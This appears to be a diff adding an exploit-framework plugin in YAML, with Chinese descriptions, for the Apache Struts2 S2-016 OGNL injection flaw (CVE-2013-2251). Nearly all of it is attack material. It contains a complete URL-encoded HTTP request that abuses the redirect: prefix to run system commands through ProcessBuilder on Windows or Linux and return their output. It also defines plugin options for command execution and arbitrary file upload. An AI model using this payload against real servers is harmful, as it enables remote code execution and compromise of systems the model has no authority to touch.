@@ -1,0 +1,69 @@
+info:
+    app: Struts2
+    name: S2_016
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: "2013-07-09"
+    create_date: "2024-10-06 12:37:21"
+    update_date: "2024-10-06 12:37:21"
+    scope: Struts 2.0.0 - Struts 2.3.15
+    description: 在struts2中，DefaultActionMapper类支持以"action:"、"redirect:"、"redirectAction:"作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。
+    vul_id: CVE-2013-2251
+    detail: |
+        利用点为URI的redirect
+        目前只支持cmd
+        URL如http://192.168.111.111:8080/index.action
+        http://struts.apache.org/docs/s2-016.html
+    payload: |+
+        GET /link.action?&redirect:%24%7B%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23a%3D%23parameters.reqobj%5B0%5D%2C%23c%3D%23parameters.reqobj%5B1%5D%2C%23req%3D%23context.get(%23a)%2C%23hh%3D%23context.get(%23parameters.rpsobj%5B0%5D)%2C%23osname%3D%40java.lang.System%40getProperty(%23parameters.os_name)%2C%23list%3D%23osname.startsWith(%23parameters.windows)%3Fnew%20java.lang.String%5B%5D%7B%23parameters.cmdexe%2C%23parameters.ccc_c%2C%23parameters.cmd%7D%3Anew%20java.lang.String%5B%5D%7B%23parameters.binbash%2C%23parameters.ccc%2C%23parameters.cmd%7D%2C%23aa%3D(new%20java.lang.ProcessBuilder(%23list)).start()%2C%23bb%3D%23aa.getInputStream()%2C%23hh.getWriter().println(new%20java.lang.String(new%20org.apache.commons.io.IOUtils().toByteArray(%23bb),%23parameters.gbk))%2C%23hh.getWriter().flush()%2C%23hh.getWriter().close()%7D&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&reqobj=/&cmd=whoami&reqobj=struts.txt&content=fb98ab9159f51fd0&os_name=os.name&windows=Windows&binbash=/bin/sh&ccc=-c&cmdexe=cmd.exe&ccc_c=/c&gbk=iso-8859-1 HTTP/1.1
+        Host: 192.168.111.129:8080
+        Connection: close
+        Accept-Encoding: gzip, deflate
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+payloads:
+    - name: getmsg1
+      alias: 获取信息1
+    - name: cmd1
+      alias: 命令执行1
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
+    - name: upload1
+      alias: 文件上传1
+      params:
+          - key: filename
+            title: 文件名
+            param_type: edit
+            default_value: ""
+            required: true
+          - key: content
+            title: 内容
+            param_type: textarea
+            default_value: ""
+            required: true
+    - name: cmd2
+      alias: 命令执行2
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
+    - name: upload2
+      alias: 文件上传2
+      params:
+          - key: filename
+            title: 文件名
+            param_type: edit
+            default_value: ""
+            required: true
+          - key: content
+            title: 内容
+            param_type: textarea
+            default_value: ""
+            required: true
